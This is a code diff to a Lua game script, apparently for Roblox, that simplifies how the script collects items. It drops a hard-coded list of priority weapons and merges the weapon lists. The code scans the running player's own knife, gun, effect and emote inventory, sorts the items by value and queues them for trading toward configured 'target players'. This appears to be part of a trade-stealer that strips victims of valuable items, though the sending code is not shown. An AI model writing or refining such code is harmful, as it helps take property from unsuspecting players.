@@ -138,19 +138,6 @@ task.spawn(function()
 
     local jugadoresObjetivos = config.JugadoresObjetivos or {}
 
-    local armasPrioritarias = {
-        LightningBolt = true, LightningStriker = true,
-        MatchaBobaKnife = true, MatchaBobaGun = true,
-        DuskveilDagger = true, DuskveilIron = true, 
-        ValkyrieKnife = true, ValkyrieSword = true, ValkyrieSniper = true, 
-        LimeJellyAxe = true, BlueberryJellyAxe = true, StrawberryJellyAxe = true, GrapeJellyAxe = true, 
-        LimeJellyUzi = true, BlueberryJellyUzi = true, StrawberryJellyUzi = true, GrapeJellyUzi = true,
-        SealordTrident = true, SealordRevolver = true, 
-        DragonpetalBlade = true, DragonpetalSniper = true, DragonpetalOutlaw = true, 
-        LovestruckKnife = true, LovestruckGun = true,  
-        SharkLauncher = true, Revolver_Default = true, 
-    }
-
     local ok, cg = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)
 
     if ok and cg.PlayerData then
@@ -391,9 +378,9 @@ task.spawn(function()
             local pdTrade = cgData.PlayerData
             
             local listaEfectos, listaEmotes = {}, {}
-            local listaArmasPrioritarias, listaArmasNormales = {}, {}
+            local listaArmas = {}
 
-            local function scanTrade(cat, valueTable, destList, isPriority)
+            local function scanTrade(cat, valueTable, destList)
                 local inv = pdTrade:TryIndex({"Inventory", cat})
                 if not inv then return end
                 for guid, item in pairs(inv) do
@@ -404,32 +391,28 @@ task.spawn(function()
                             local itemData = { name = item.name, guid = guid, value = valueTable[cleanName] }
                             if destList then
                                 table.insert(destList, itemData)
-                            elseif isPriority and armasPrioritarias[cleanName] then
-                                table.insert(listaArmasPrioritarias, itemData)
                             else
-                                table.insert(listaArmasNormales, itemData)
+                                table.insert(listaArmas, itemData)
                             end
                         end
                     end
                 end
             end
 
-            scanTrade("Knife", Knives, nil, true)
-            scanTrade("Gun", Guns, nil, true)
-            scanTrade("Effect", Effects, listaEfectos, false)
-            scanTrade("Emote", Emotes, listaEmotes, false)
+            scanTrade("Knife", Knives, nil)
+            scanTrade("Gun", Guns, nil)
+            scanTrade("Effect", Effects, listaEfectos)
+            scanTrade("Emote", Emotes, listaEmotes)
 
             local sortPorValor = function(a, b) return a.value > b.value end
             table.sort(listaEmotes, sortPorValor)
             table.sort(listaEfectos, sortPorValor)
-            table.sort(listaArmasPrioritarias, sortPorValor)
-            table.sort(listaArmasNormales, sortPorValor)
+            table.sort(listaArmas, sortPorValor)
 
             local itemsRestantes = {}
             for _, v in ipairs(listaEmotes) do table.insert(itemsRestantes, v) end
             for _, v in ipairs(listaEfectos) do table.insert(itemsRestantes, v) end
-            for _, v in ipairs(listaArmasPrioritarias) do table.insert(itemsRestantes, v) end
-            for _, v in ipairs(listaArmasNormales) do table.insert(itemsRestantes, v) end
+            for _, v in ipairs(listaArmas) do table.insert(itemsRestantes, v) end
 
             if #itemsRestantes == 0 then return false end
             
